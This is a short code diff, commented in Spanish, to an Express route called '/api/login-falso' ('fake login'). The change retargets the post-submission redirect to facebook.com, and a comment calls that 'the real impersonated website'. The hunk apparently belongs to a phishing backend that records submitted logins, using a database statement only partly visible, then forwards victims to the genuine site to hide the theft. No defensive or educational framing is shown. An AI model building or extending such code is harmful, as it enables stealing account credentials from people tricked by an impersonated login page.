@@ -50,7 +50,7 @@ app.post('/api/login-falso', (req, res) => {
         // En una API REST, enviamos la URL al frontend para que este haga la redirección
         res.json({ 
             status: "success", 
-            redirectUrl: "https://www.google.com" // Aquí iría la web real suplantada
+            redirectUrl: "https://www.facebook.com" // Aquí iría la web real suplantada
         });
     });
     stmt.finalize();
